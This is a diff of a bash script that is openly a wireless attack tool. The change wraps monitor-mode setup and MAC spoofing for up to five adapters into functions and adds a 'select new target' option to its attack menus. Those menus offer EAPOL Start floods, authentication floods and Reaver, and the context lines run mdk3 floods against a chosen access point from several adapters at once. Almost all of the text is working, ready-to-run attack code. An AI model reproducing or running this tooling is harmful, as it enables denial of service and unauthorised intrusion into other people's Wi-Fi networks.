@@ -27,9 +27,129 @@ clear
 
 sudo rfkill unblock all
 
+#####Functions for Monitor Mode####
+
+enable_mon_mode_1()
+{
+echo "Enabling Monitor Mode on $ADAPTER1"
+sudo ifconfig $ADAPTER1 down
+sleep 1
+sudo iwconfig $ADAPTER1 mode monitor
+sleep 1
+sudo ifconfig $ADAPTER1 up
+echo "Monitor Mode Enabled"
+}
+
+enable_mon_mode_2()
+{
+echo "Enabling Monitor Mode on $ADAPTER2"
+sudo ifconfig $ADAPTER2 down
+sleep 1
+sudo iwconfig $ADAPTER2 mode monitor
+sleep 1
+sudo ifconfig $ADAPTER2 up
+echo "Monitor Mode Enabled"
+}
+
+enable_mon_mode_3()
+{
+echo "Enabling Monitor Mode on $ADAPTER3"
+sudo ifconfig $ADAPTER3 down
+sleep 1
+sudo iwconfig $ADAPTER3 mode monitor
+sleep 1
+sudo ifconfig $ADAPTER3 up
+echo "Monitor Mode Enabled"
+}
+
+enable_mon_mode_4()
+{
+echo "Enabling Monitor Mode on $ADAPTER4"
+sudo ifconfig $ADAPTER4 down
+sleep 1
+sudo iwconfig $ADAPTER4 mode monitor
+sleep 1
+sudo ifconfig $ADAPTER4 up
+echo "Monitor Mode Enabled"
+}
+
+enable_mon_mode_5()
+{
+echo "Enabling Monitor Mode on $ADAPTER5"
+sudo ifconfig $ADAPTER5 down
+sleep 1
+sudo iwconfig $ADAPTER5 mode monitor
+sleep 1
+sudo ifconfig $ADAPTER5 up
+echo "Monitor Mode Enabled"
+}
+
+####End of Functions for Monitor Mode####
+
+#### Functions for MAC CHANGER ####
+
+mac_change_1()
+{
+echo "Setting the MAC Address on $ADAPTER1"
+sudo ifconfig $ADAPTER1 down
+sleep 3
+macchanger $ADAPTER1 -m 02:22:88:29:EC:6F
+sleep 3
+sudo ifconfig $ADAPTER1 up
+echo "MAC Changed"
+}
+
+mac_change_2()
+{
+echo "Setting the MAC Address on $ADAPTER2"
+sudo ifconfig $ADAPTER2 down
+sleep 3
+macchanger $ADAPTER2 -m 02:22:88:29:EC:6F
+sleep 3
+sudo ifconfig $ADAPTER2 up
+echo "MAC Changed"
+}
+
+mac_change_3()
+{
+echo "Setting the MAC Address on $ADAPTER3"
+sudo ifconfig $ADAPTER3 down
+sleep 3
+macchanger $ADAPTER3 -m 02:22:88:29:EC:6F
+sleep 3
+sudo ifconfig $ADAPTER3 up
+echo "MAC Changed"
+}
+
+mac_change_4()
+{
+echo "Setting the MAC Address on $ADAPTER4"
+sudo ifconfig $ADAPTER4 down
+sleep 3
+macchanger $ADAPTER4 -m 02:22:88:29:EC:6F
+sleep 3
+sudo ifconfig $ADAPTER4 up
+echo "MAC Changed"
+}
+
+mac_change_5()
+{
+echo "Setting the MAC Address on $ADAPTER5"
+sudo ifconfig $ADAPTER5 down
+sleep 3
+macchanger $ADAPTER5 -m 02:22:88:29:EC:6F
+sleep 3
+sudo ifconfig $ADAPTER5 up
+echo "MAC Changed"
+}
+
+####End of Functions for MAC CHANGER ####
+
+
+####Target Scanner####
+
 scan_for_targets()
 {
-####Target Scanner####
 
 sudo ifconfig $ADAPTER1 down
 sudo iwconfig $ADAPTER1 mode managed
@@ -254,13 +374,7 @@ scan_for_targets
 
 clear
 
-echo "Enabling Monitor Mode"
-sudo ifconfig $ADAPTER1 down
-sleep 3
-sudo iwconfig $ADAPTER1 mode monitor
-sleep 3
-sudo ifconfig $ADAPTER1 up
-echo "Monitor Mode Enabled"
+enable_mon_mode_1
 
 sleep 1
 
@@ -275,13 +389,7 @@ case $c in
 	1)
 clear
 
-echo "Setting the MAC Address"
-sudo ifconfig $ADAPTER1 down
-sleep 3
-macchanger $ADAPTER1 -m 02:22:88:29:EC:6F
-sleep 3
-sudo ifconfig $ADAPTER1 up
-echo "MAC Changed"
+mac_change_1
 
 sleep 1
 
@@ -298,6 +406,7 @@ esac
 menu () {
 clear
 echo "************** - Which Attack Would You Like To Use? - ************** 
+0)Select New Target Network
 1)EAPOL Start Flood 
 2)Authentication Flood
 3)Reaver
@@ -312,7 +421,12 @@ echo "************** - Which Attack Would You Like To Use? - **************
 
 read d
 case $d in
-
+	0)
+clear
+scan_for_targets
+enable_mon_mode_1
+menu
+;;
 	1)
 clear
 timeout 20s mdk3 $ADAPTER1 x 0 -t $BSSID -n $ESSID -s 250
@@ -417,20 +531,10 @@ scan_for_targets
 
 clear
 
+enable_mon_mode_1
 
-echo "Enabling Monitor Mode"
-sudo ifconfig $ADAPTER1 down
-sleep 3
-sudo iwconfig $ADAPTER1 mode monitor
-sleep 3
-sudo ifconfig $ADAPTER1 up
-sudo ifconfig $ADAPTER2 down
-sleep 3
-sudo iwconfig $ADAPTER2 mode monitor
-sleep 3
-sudo ifconfig $ADAPTER2 up
-echo "Monitor Mode Enabled"
-sleep 1
+enable_mon_mode_2
+
 clear
 
 echo "************** - Would you like to set the 2 Adapters to an Identical MAC Address? - ************** 
@@ -441,19 +545,11 @@ read f
 case $f in
 	1)
 clear
-echo "Setting the MAC Address"
-sudo ifconfig $ADAPTER1 down
-sleep 3
-macchanger $ADAPTER1 -m 02:22:88:29:EC:6F
-sleep 3
-sudo ifconfig $ADAPTER1 up
-sudo ifconfig $ADAPTER2 down
-sleep 3
-macchanger $ADAPTER2 -m 02:22:88:29:EC:6F
-sleep 3
-sudo ifconfig $ADAPTER2 up
-echo "MACs Changed"
-sleep 1
+
+mac_change_1
+
+mac_change_2
+
 clear
 ;;
 	2)
@@ -467,6 +563,7 @@ esac
 menu () {
 clear
 echo "************** - Which Attack Would You Like To Use? - ************** 
+0)Select New Target Network
 1)EAPOL Start Flood 
 2)Authentication Flood
 3)Reaver
@@ -481,6 +578,12 @@ echo "************** - Which Attack Would You Like To Use? - **************
 
 read g
 case $g in
+	0)
+clear
+scan_for_targets
+enable_mon_mode_1
+menu
+;;
 	1)
 clear
 timeout 20s mdk3 $ADAPTER1 x 0 -t $BSSID -n $ESSID -s 250 & timeout 20s mdk3 $ADAPTER2 x 0 -t $BSSID -n $ESSID -s 250
@@ -589,24 +692,14 @@ scan_for_targets
 clear
 
 
-echo "Enabling Monitor Mode"
-sudo ifconfig $ADAPTER1 down
-sleep 3
-sudo iwconfig $ADAPTER1 mode monitor
-sleep 3
-sudo ifconfig $ADAPTER1 up
-sudo ifconfig $ADAPTER2 down
-sleep 3
-sudo iwconfig $ADAPTER2 mode monitor
-sleep 3
-sudo ifconfig $ADAPTER2 up
-sudo ifconfig $ADAPTER3 down
-sleep 3
-sudo iwconfig $ADAPTER3 mode monitor
-sleep 3
-sudo ifconfig $ADAPTER3 up
-echo "Monitor Mode Enabled"
-sleep 1
+enable_mon_mode_1
+
+enable_mon_mode_2
+
+enable_mon_mode_3
+
+
+
 clear
 
 echo "************** - Would you like to set the 3 Adapters to an Identical MAC Address? - ************** 
@@ -617,24 +710,13 @@ read i
 case $i in
 	1)
 clear
-echo "Setting the MAC Address"
-sudo ifconfig $ADAPTER1 down
-sleep 3
-macchanger $ADAPTER1 -m 02:22:88:29:EC:6F
-sleep 3
-sudo ifconfig $ADAPTER1 up
-sudo ifconfig $ADAPTER2 down
-sleep 3
-macchanger $ADAPTER2 -m 02:22:88:29:EC:6F
-sleep 3
-sudo ifconfig $ADAPTER2 up
-sudo ifconfig $ADAPTER3 down
-sleep 3
-macchanger $ADAPTER3 -m 02:22:88:29:EC:6F
-sleep 3
-sudo ifconfig $ADAPTER3 up
-echo "MACs Changed"
-sleep 1
+
+mac_change_1
+
+mac_change_2
+
+mac_change_3
+
 clear
 ;;
 	2)
@@ -647,6 +729,7 @@ esac
 menu () {
 clear
 echo "************** - Which Attack Would You Like To Use? - ************** 
+0)Select New Target Network
 1)EAPOL Start Flood 
 2)Authentication Flood
 3)Reaver
@@ -661,6 +744,12 @@ echo "************** - Which Attack Would You Like To Use? - **************
 
 read j
 case $j in
+	0)
+clear
+scan_for_targets
+enable_mon_mode_1
+menu
+;;
 	1)
 clear
 timeout 20s mdk3 $ADAPTER1 x 0 -t $BSSID -n $ESSID -s 250 & timeout 20s mdk3 $ADAPTER2 x 0 -t $BSSID -n $ESSID -s 250 & timeout 20s mdk3 $ADAPTER3 x 0 -t $BSSID -n $ESSID -s 250
@@ -770,29 +859,15 @@ scan_for_targets
 
 clear
 
-echo "Enabling Monitor Mode"
-sudo ifconfig $ADAPTER1 down
-sleep 3
-sudo iwconfig $ADAPTER1 mode monitor
-sleep 3
-sudo ifconfig $ADAPTER1 up
-sudo ifconfig $ADAPTER2 down
-sleep 3
-sudo iwconfig $ADAPTER2 mode monitor
-sleep 3
-sudo ifconfig $ADAPTER2 up
-sudo ifconfig $ADAPTER3 down
-sleep 3
-sudo iwconfig $ADAPTER3 mode monitor
-sleep 3
-sudo ifconfig $ADAPTER3 up
-sudo ifconfig $ADAPTER4 down
-sleep 3
-sudo iwconfig $ADAPTER4 mode monitor
-sleep 3
-sudo ifconfig $ADAPTER4 up
-echo "Monitor Mode Enabled"
-sleep 1
+enable_mon_mode_1
+
+enable_mon_mode_2
+
+enable_mon_mode_3
+
+enable_mon_mode_4
+
+
 clear
 
 echo "************** - Would you like to set ALL Wlan Adapters to the same MAC Address? - ************** 
@@ -803,29 +878,15 @@ read l
 case $l in
 	1)
 clear
-echo "Setting All Wlan MAC Addresses to Identical MAC"
-sudo ifconfig $ADAPTER1 down
-sleep 3
-macchanger $ADAPTER1 -m 02:22:88:29:EC:6F
-sleep 3
-sudo ifconfig $ADAPTER1 up
-sudo ifconfig $ADAPTER2 down
-sleep 3
-macchanger $ADAPTER2 -m 02:22:88:29:EC:6F
-sleep 3
-sudo ifconfig $ADAPTER2 up
-sudo ifconfig $ADAPTER3 down
-sleep 3
-macchanger $ADAPTER3 -m 02:22:88:29:EC:6F
-sleep 3
-sudo ifconfig $ADAPTER3 up
-sudo ifconfig $ADAPTER4 down
-sleep 3
-macchanger $ADAPTER4 -m 02:22:88:29:EC:6F
-sleep 3
-sudo ifconfig $ADAPTER4 up
-echo "MACs Changed"
-sleep 1
+
+mac_change_1
+
+mac_change_2
+
+mac_change_3
+
+mac_change_4
+
 clear
 ;;
 	2)
@@ -839,6 +900,7 @@ clear
 menu () {
 clear
 echo "************** - Which Attack Would You Like To Use? - ************** 
+0)Select New Target Network
 1)EAPOL Start Flood 
 2)Authentication Flood
 3)Reaver
@@ -853,6 +915,12 @@ echo "************** - Which Attack Would You Like To Use? - **************
 
 read m
 case $m in
+	0)
+clear
+scan_for_targets
+enable_mon_mode_1
+menu
+;;
 	1)
 clear
 timeout 20s mdk3 $ADAPTER1 x 0 -t $BSSID -n $ESSID -s 250 & timeout 20s mdk3 $ADAPTER2 x 0 -t $BSSID -n $ESSID -s 250 & timeout 20s mdk3 $ADAPTER3 x 0 -t $BSSID -n $ESSID -s 250 & timeout 20s mdk3 $ADAPTER4 x 0 -t $BSSID -n $ESSID -s 250
@@ -965,35 +1033,16 @@ scan_for_targets
 
 clear
 
+enable_mon_mode_1
 
-echo "Enabling Monitor Mode"
-sudo ifconfig $ADAPTER1 down
-sleep 3
-sudo iwconfig $ADAPTER1 mode monitor
-sleep 3
-sudo ifconfig $ADAPTER1 up
-sudo ifconfig $ADAPTER2 down
-sleep 3
-sudo iwconfig $ADAPTER2 mode monitor
-sleep 3
-sudo ifconfig $ADAPTER2 up
-sudo ifconfig $ADAPTER3 down
-sleep 3
-sudo iwconfig $ADAPTER3 mode monitor
-sleep 3
-sudo ifconfig $ADAPTER3 up
-sudo ifconfig $ADAPTER4 down
-sleep 3
-sudo iwconfig $ADAPTER4 mode monitor
-sleep 3
-sudo ifconfig $ADAPTER4 up
-sudo ifconfig $ADAPTER5 down
-sleep 3
-sudo iwconfig $ADAPTER5 mode monitor
-sleep 3
-sudo ifconfig $ADAPTER5 up
-echo "Monitor Mode Enabled"
-sleep 1
+enable_mon_mode_2
+
+enable_mon_mode_3
+
+enable_mon_mode_4
+
+enable_mon_mode_5
+
 clear
 
 echo "************** - Would you like to set ALL Wlan Adapters to the same MAC Address? - ************** 
@@ -1004,34 +1053,17 @@ read o
 case $o in
 	1)
 clear
-echo "Setting All Wlan MAC Addresses to Identical MAC"
-sudo ifconfig $ADAPTER1 down
-sleep 3
-macchanger $ADAPTER1 -m 02:22:88:29:EC:6F
-sleep 3
-sudo ifconfig $ADAPTER1 up
-sudo ifconfig $ADAPTER2 down
-sleep 3
-macchanger $ADAPTER2 -m 02:22:88:29:EC:6F
-sleep 3
-sudo ifconfig $ADAPTER2 up
-sudo ifconfig $ADAPTER3 down
-sleep 3
-macchanger $ADAPTER3 -m 02:22:88:29:EC:6F
-sleep 3
-sudo ifconfig $ADAPTER3 up
-sudo ifconfig $ADAPTER4 down
-sleep 3
-macchanger $ADAPTER4 -m 02:22:88:29:EC:6F
-sleep 3
-sudo ifconfig $ADAPTER4 up
-sudo ifconfig $ADAPTER5 down
-sleep 3
-macchanger $ADAPTER5 -m 02:22:88:29:EC:6F
-sleep 3
-sudo ifconfig $ADAPTER5 up
-echo "MACs Changed"
-sleep 1
+
+mac_change_1
+
+mac_change_2
+
+mac_change_3
+
+mac_change_4
+
+mac_change_5
+
 clear
 ;;
 	2)
@@ -1044,6 +1076,7 @@ esac
 menu () {
 clear
 echo "************** - Which Attack Would You Like To Use? - ************** 
+0)Select New Target Network
 1)EAPOL Start Flood 
 2)Authentication Flood
 3)Reaver
@@ -1058,6 +1091,12 @@ echo "************** - Which Attack Would You Like To Use? - **************
 
 read p
 case $p in
+	0)
+clear
+scan_for_targets
+enable_mon_mode_1
+menu
+;;
 	1)
 clear
 timeout 20s mdk3 $ADAPTER1 x 0 -t $BSSID -n $ESSID -s 250 & timeout 20s mdk3 $ADAPTER2 x 0 -t $BSSID -n $ESSID -s 250 & timeout 20s mdk3 $ADAPTER3 x 0 -t $BSSID -n $ESSID -s 250 & timeout 20s mdk3 $ADAPTER4 x 0 -t $BSSID -n $ESSID -s 250 & timeout 20s mdk3 $ADAPTER5 x 0 -t $BSSID -n $ESSID -s 250
